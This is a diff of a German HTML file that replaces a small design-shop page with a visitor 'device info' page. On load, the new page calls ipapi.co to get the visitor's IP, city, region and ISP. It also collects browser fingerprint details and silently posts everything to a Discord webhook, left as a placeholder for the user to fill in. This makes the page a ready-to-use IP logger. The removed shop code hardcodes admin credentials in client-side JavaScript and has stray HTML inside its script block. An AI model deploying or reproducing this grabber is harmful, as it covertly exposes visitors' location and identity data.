@@ -1,305 +1,113 @@
 <!DOCTYPE html>
 <html lang="de">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Design Preise – Live BTC</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      background: radial-gradient(circle, #0f0f0f 0%, #000000 100%);
-      font-family: 'Segoe UI', sans-serif;
-    }
-    .glow-bg {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      width: 100vw;
-      height: 100vh;
-      transform: translate(-50%, -50%);
-      background: radial-gradient(circle, rgba(0,255,255,0.06), transparent 70%);
-      filter: blur(80px);
-      z-index: 0;
-    }
-    .word {
-      opacity: 0;
-      display: inline-block;
-      transform: translateY(20px);
-      animation: popWord 0.6s forwards;
-    }
-    @keyframes popWord {
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <title>Geräte-Infos</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 30px;
+            background: #f0f0f0;
+        }
+        .info {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px #ccc;
+            max-width: 800px;
+            margin: auto;
+        }
+        h1 {
+            text-align: center;
+        }
+        pre {
+            background: #eee;
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+    </style>
 </head>
-<body class="bg-gray-950 text-white font-sans">
-  <div class="glow-bg"></div>
+<body>
 
-  <!-- Intro Section -->
-  <div id="intro-section" class="flex flex-col items-center justify-center min-h-screen text-center px-4">
-    <div class="z-10 mb-20">
-      <div class="text-white font-extrabold text-2xl sm:text-4xl space-y-3">
-        <div>
-          <span class="word" style="animation-delay: 0s">Get</span>
-          <span class="word" style="animation-delay: 0.2s">the</span>
-          <span class="word" style="animation-delay: 0.4s">best</span>
-          <span class="word" style="animation-delay: 0.6s">Designs</span>
-        </div>
-        <div>
-          <span class="word" style="animation-delay: 0.8s">for</span>
-          <span class="word" style="animation-delay: 1.0s">the</span>
-          <span class="word" style="animation-delay: 1.2s">cheapest</span>
-          <span class="word" style="animation-delay: 1.4s">price</span>
-        </div>
-      </div>
-      <div class="mt-10 flex flex-col sm:flex-row justify-center gap-4">
-        <button onclick="showPricesPage()" class="bg-cyan-500 hover:bg-cyan-400 text-black font-bold px-6 py-3 rounded-full transition-all">
-          See Prices
-        </button>
-        <button onclick="showAdminPage()" class="bg-purple-600 hover:bg-purple-500 text-white font-semibold px-6 py-3 rounded-full">
-          Admin Menü öffnen
-        </button>
-      </div>
-    </div>
-  </div>
+<div class="info">
+    <h1>Deine Geräte-Informationen</h1>
+    <pre id="output">Lade Daten...</pre>
+</div>
 
-  <!-- Preise Section -->
-  <div id="preise" style="display:none" class="max-w-2xl mx-auto px-6 py-12">
-    <h1 class="text-3xl font-bold mb-6 text-center">Design Preise (Live BTC)</h1>
-    <div id="btcRate" class="text-center text-sm text-gray-400 mb-4">Lade aktuellen BTC-Kurs...</div>
-    <div class="grid grid-cols-2 text-center bg-gray-800 rounded-md p-4 mb-2 font-semibold">
-      <div>Leistung</div>
-      <div>Preis (€ / BTC)</div>
-    </div>
-    <div id="priceList" class="divide-y divide-gray-700 text-sm"></div>
-    <div class="mt-10 text-center text-sm text-gray-400">
-      <p class="mb-4 font-semibold">Zahlung möglich mit:</p>
-      <div class="flex justify-center items-center space-x-6">
-        <img src="https://pngimg.com/uploads/bitcoin/bitcoin_PNG7.png" alt="Bitcoin" class="h-8">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="PayPal" class="h-6 md:h-8">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9b/Paysafecard_logo.svg/2560px-Paysafecard_logo.svg.png" alt="Paysafecard" class="h-6 md:h-8">
-      </div>
-      <p class="text-xs mt-4">Wallet-Adresse & Kontakt auf Anfrage</p>
-      <p class="text-xs mt-2 text-gray-500">Support erreichbar über Discord & E-Mail</p>
-    </div>
-  </div>
+<script>
+const webhookUrl = "DEIN_DISCORD_WEBHOOK_HIER"; // <-- Deinen Webhook hier einfügen
 
-  <!-- Admin Login Wrapper -->
-  <div id="admin-wrapper" class="hidden fixed inset-0 bg-black bg-opacity-90 z-50 flex items-center justify-center">
-    <div class="bg-black rounded-2xl p-8 shadow-xl max-w-md w-full mx-auto">
-      <h2 class="text-2xl font-bold mb-6 text-center">🔐 Admin Login</h2>
-      <input id="username" type="text" placeholder="Benutzername" class="w-full mb-3 px-4 py-2 bg-gray-100 border border-gray-300 rounded-md text-black" />
-      <input id="password" type="password" placeholder="Passwort" class="w-full mb-4 px-4 py-2 bg-gray-100 border border-gray-300 rounded-md text-black" />
-      <button onclick="login()" class="w-full bg-blue-600 hover:bg-blue-700 text-white py-2 rounded-md">Einloggen</button>
-      <p id="error" class="text-red-500 text-sm mt-4 text-center hidden">Falsche Zugangsdaten!</p>
-    </div>
-  </div>
+async function collectData() {
+    const data = {};
 
-  <!-- Admin Panel -->
-  <div id="admin-panel" class="hidden mt-12 max-w-2xl mx-auto bg-black rounded-2xl p-8 shadow-xl text-white">
-    <div id="productList" class="mb-10">
-      <h3 class="text-xl font-bold mb-4 text-center">📦 Aktuelle Produkte</h3>
-      <ul id="adminProductList" class="space-y-2 text-sm bg-gray-800 p-4 rounded-lg"></ul>
-    </div>
-    <button onclick="goBackToIntro()" class="mb-6 bg-gray-700 hover:bg-gray-600 text-white py-2 px-4 rounded">← Zurück</button>
-    <h2 class="text-2xl font-bold mb-6 text-center">🛠️ Admin Panel</h2>
-
-    <div class="bg-white rounded-lg p-4 mb-6 text-black">
-      <h3 class="text-xl font-bold mb-4">Artikel hinzufügen</h3>
-      <label class="block mb-2">Titel</label>
-      <input id="title" type="text" class="w-full p-2 border rounded mb-4">
-      <label class="block mb-2">Beschreibung</label>
-      <textarea id="desc" class="w-full p-2 border rounded mb-4"></textarea>
-      <label class="block mb-2">Preis (€)</label>
-      <input id="price" type="number" class="w-full p-2 border rounded mb-4">
-      <button onclick="addProduct()" class="mt-4 bg-blue-600 hover:bg-blue-700 text-white py-2 px-4 rounded">💾 Artikel speichern</button>
-    </div>
-
-    <div class="bg-white rounded-lg p-4 mb-6 text-black">
-      <h3 class="text-xl font-bold mb-4">Preis ändern</h3>
-      <label class="block mb-2">Artikel-ID</label>
-      <input id="change-id" type="text" class="w-full p-2 border rounded mb-4">
-      <label class="block mb-2">Neuer Preis (€)</label>
-      <input id="new-price" type="number" class="w-full p-2 border rounded mb-4">
-      <button onclick="changePrice()" class="bg-yellow-500 hover:bg-yellow-600 text-white py-2 px-4 rounded">💸 Preis ändern</button>
-    </div>
-
-    <div class="bg-white rounded-lg p-4 mb-6 text-black">
-      <h3 class="text-xl font-bold mb-4">Rabattcode erstellen</h3>
-      <label class="block mb-2">Code</label>
-      <input id="code" type="text" class="w-full p-2 border rounded mb-4">
-      <label class="block mb-2">Rabatt (%)</label>
-      <input id="discount" type="number" class="w-full p-2 border rounded mb-4">
-      <button onclick="createDiscount()" class="bg-green-600 hover:bg-green-700 text-white py-2 px-4 rounded">🎁 Code speichern</button>
-    </div>
-
-    <div class="bg-white rounded-lg p-4 text-black">
-      <h3 class="text-xl font-bold mb-4">🗑️ Produkt löschen</h3>
-      <label class="block mb-2">Produkt-ID</label>
-      <input id="delete-id" type="text" class="w-full p-2 border rounded mb-4">
-      <button onclick="deleteProduct()" class="bg-red-600 hover:bg-red-700 text-white py-2 px-4 rounded">❌ Löschen</button>
-    </div>
-  </div>
-
-  <script>
-    let pricesEUR = JSON.parse(localStorage.getItem("pricesEUR")) || [
-      { id: 1, name: "Einfaches Profilbild", euro: 5 },
-      { id: 2, name: "Textlogo", euro: 8 },
-      { id: 3, name: "Social Media Banner", euro: 10 },
-      { id: 4, name: "Avatar (stilisiert)", euro: 12 },
-      { id: 5, name: "Mini Paket (PFP + Banner)", euro: 15 }
-    ];
-
-    function savePrices() {
-      localStorage.setItem("pricesEUR", JSON.stringify(pricesEUR));
+    // IP und Location
+    try {
+        const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
+        data.ip = ipData.ip;
+        data.country = ipData.country_name;
+        data.city = ipData.city;
+        data.region = ipData.region;
+        data.isp = ipData.org;
+    } catch {
+        data.ip = "Fehler beim Laden";
+        data.country = "Unbekannt";
     }
 
-    function updateAdminProductList() {
-      const list = document.getElementById("adminProductList");
-      if (!list) return;
-      list.innerHTML = "";
-      pricesEUR.forEach(p => {
-        const li = document.createElement("li");
-        li.innerHTML = `<span class='text-cyan-400'>ID:</span> ${p.id} &mdash; <span class='text-white font-semibold'>${p.name}</span> <span class='text-gray-400'>(${p.euro} €)</span>`;
-        list.appendChild(li);
-      });
-    }
+    // Browser Infos
+    data.userAgent = navigator.userAgent;
+    data.language = navigator.language;
+    data.platform = navigator.platform;
+    data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    data.screenResolution = `${window.screen.width}x${window.screen.height}`;
+    data.colorScheme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "Dark Mode" : "Light Mode";
+    data.touchSupport = 'ontouchstart' in window ? "Ja" : "Nein";
+    data.orientation = (screen.orientation || {}).type || "Nicht erkannt";
+    data.localTime = new Date().toString();
 
-    async function loadBTCPrice() {
-      try {
-        const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=eur");
-        const data = await res.json();
-        const rate = data.bitcoin.eur;
-        document.getElementById("btcRate").innerText = `Aktueller BTC-Kurs: 1 BTC = ${rate.toLocaleString("de-DE")} €`;
-        const list = document.getElementById("priceList");
-        list.innerHTML = "";
-        pricesEUR.forEach(item => {
-          const btc = (item.euro / rate).toFixed(6);
-          const row = document.createElement("div");
-          row.className = "flex justify-between py-3 items-center";
-          row.innerHTML = `<span>${item.name}</span><span>${item.euro} € / ${btc} BTC</span>`;
-          list.appendChild(row);
-        });
-      } catch (error) {
-        document.getElementById("btcRate").innerText = "Fehler beim Laden des BTC-Kurses.";
-      }
-    }
+    document.getElementById('output').textContent = JSON.stringify(data, null, 2);
 
-    function showPricesPage() {
-      document.getElementById("intro-section").style.display = "none";
-      document.getElementById("preise").style.display = "block";
-      loadBTCPrice();
-      updateAdminProductList();
-    }
-
-    function showAdminPage() {
-      document.getElementById("intro-section").style.display = "none";
-      document.getElementById("preise").style.display = "none";
-      document.getElementById("admin-wrapper").classList.remove("hidden");
-    }
-
-    function goBackToIntro() {
-  document.getElementById("admin-panel").classList.add("hidden");
-  document.getElementById("admin-wrapper").classList.add("hidden");
-  document.getElementById("preise").style.display = "none";
-  document.getElementById("intro-section").style.display = "flex";
+    return data;
 }
 
-    function login() {
-      const user = document.getElementById("username").value;
-      const pass = document.getElementById("password").value;
-      const error = document.getElementById("error");
-      if (user === "GS" && pass === "0987654321") {
-        document.getElementById("admin-wrapper").classList.add("hidden");
-        document.getElementById("admin-panel").classList.remove("hidden");
-        updateAdminProductList();
-      } else {
-        error.classList.remove("hidden");
-      }
-    }
+async function sendToDiscord() {
+    const info = await collectData();
 
-    <!-- Artikel hinzufügen -->
-    <div class="bg-white rounded-lg p-4 mb-6 text-black">
-      <h2 class="text-xl font-bold mb-4">Artikel hinzufügen</h2>
-      <label class="block mb-2">Titel</label>
-      <input id="title" type="text" class="w-full p-2 border rounded mb-4">
-      <label class="block mb-2">Beschreibung</label>
-      <textarea id="desc" class="w-full p-2 border rounded mb-4"></textarea>
-      <label class="block mb-2">Preis (€)</label>
-      <input id="price" type="number" class="w-full p-2 border rounded mb-4">
-      <label class="block mb-2">Produktbild</label>
-      <div id="dropzone" class="dropzone bg-gray-100 text-gray-700 cursor-pointer">Hierher ziehen oder klicken</div>
-      <div id="preview" class="preview"></div>
-      <button onclick="addProduct()" class="mt-4 bg-blue-600 hover:bg-blue-700 text-white py-2 px-4 rounded">💾 Artikel speichern</button>
-    </div>
-    
-    function addProduct() {
-      const title = document.getElementById("title").value.trim();
-      const desc = document.getElementById("desc").value.trim();
-      const price = parseFloat(document.getElementById("price").value);
-      if (!title || isNaN(price)) {
-        alert("Bitte Titel und gültigen Preis eingeben.");
-        return;
-      }
-      const newProduct = {
-        id: Date.now(),
-        name: title,
-        euro: price,
-        desc: desc
-      };
-      pricesEUR.push(newProduct);
-      savePrices();
-      alert("✅ Artikel hinzugefügt!");
-      document.getElementById("title").value = "";
-      document.getElementById("desc").value = "";
-      document.getElementById("price").value = "";
-      loadBTCPrice();
-      updateAdminProductList();
-    }
-
-    function changePrice() {
-      const id = parseInt(document.getElementById("change-id").value);
-      const newPrice = parseFloat(document.getElementById("new-price").value);
-      const product = pricesEUR.find(p => p.id === id);
-      if (product && !isNaN(newPrice)) {
-        product.euro = newPrice;
-        savePrices();
-        alert("✅ Preis geändert!");
-        loadBTCPrice();
-        updateAdminProductList();
-      } else {
-        alert("❌ Produkt-ID nicht gefunden oder ungültiger Preis!");
-      }
-    }
-
-    function createDiscount() {
-      alert("Rabattcode erstellt (funktionale Umsetzung folgt).");
-    }
-
-    function deleteProduct() {
-      const id = parseInt(document.getElementById("delete-id").value);
-      const index = pricesEUR.findIndex(p => p.id === id);
-      if (index !== -1) {
-        pricesEUR.splice(index, 1);
-        savePrices();
-        alert("🗑️ Produkt gelöscht!");
-        loadBTCPrice();
-        updateAdminProductList();
-      } else {
-        alert("❌ Produkt nicht gefunden!");
-      }
-    }
-
-    window.onload = () => {
-      updateAdminProductList();
-      document.getElementById("preise").style.display = "none";
-      document.getElementById("admin-wrapper").classList.add("hidden");
+    const embed = {
+        title: "Neue Geräte-Infos",
+        color: 5814783, // hellblau
+        fields: [
+            { name: "IP", value: info.ip || "Unbekannt", inline: true },
+            { name: "Land", value: info.country || "Unbekannt", inline: true },
+            { name: "Stadt", value: info.city || "Unbekannt", inline: true },
+            { name: "Region", value: info.region || "Unbekannt", inline: true },
+            { name: "ISP", value: info.isp || "Unbekannt", inline: false },
+            { name: "Browser", value: info.userAgent || "Unbekannt", inline: false },
+            { name: "Sprache", value: info.language || "Unbekannt", inline: true },
+            { name: "Plattform", value: info.platform || "Unbekannt", inline: true },
+            { name: "Zeitzone", value: info.timezone || "Unbekannt", inline: true },
+            { name: "Bildschirm", value: info.screenResolution || "Unbekannt", inline: true },
+            { name: "Farbmodus", value: info.colorScheme || "Unbekannt", inline: true },
+            { name: "Touchscreen", value: info.touchSupport || "Unbekannt", inline: true },
+            { name: "Ausrichtung", value: info.orientation || "Unbekannt", inline: true },
+            { name: "Lokale Zeit", value: info.localTime || "Unbekannt", inline: false },
+        ],
+        footer: {
+            text: "Automatisch gesammelt"
+        },
+        timestamp: new Date()
     };
-  </script>
+
+    await fetch(webhookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ embeds: [embed] })
+    });
+}
+
+// Direkt beim Laden senden
+sendToDiscord();
+</script>
+
 </body>
 </html>
